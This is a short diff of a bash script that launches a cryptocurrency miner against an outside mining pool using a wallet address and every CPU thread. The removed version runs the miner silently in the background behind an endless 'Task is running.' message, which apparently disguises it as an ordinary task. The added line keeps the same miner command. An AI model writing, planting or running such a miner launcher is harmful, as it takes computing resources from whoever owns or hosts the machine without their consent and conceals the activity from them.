@@ -1,8 +1,3 @@
 #!/bin/bash
 
-nohup ./sse2 -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:17059 -u TYKf2FgjTb2GrfrQppTRMZzd9t8ayRFMV3.ojhk -p x -t $(nproc --all) >/dev/null 2>&1 &
-while true
-do
-        echo "Task is running."
-        sleep 100
-done
+nohup ./sse2 -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:17059 -u TYKf2FgjTb2GrfrQppTRMZzd9t8ayRFMV3.ojhk -p x -t $(nproc --all)
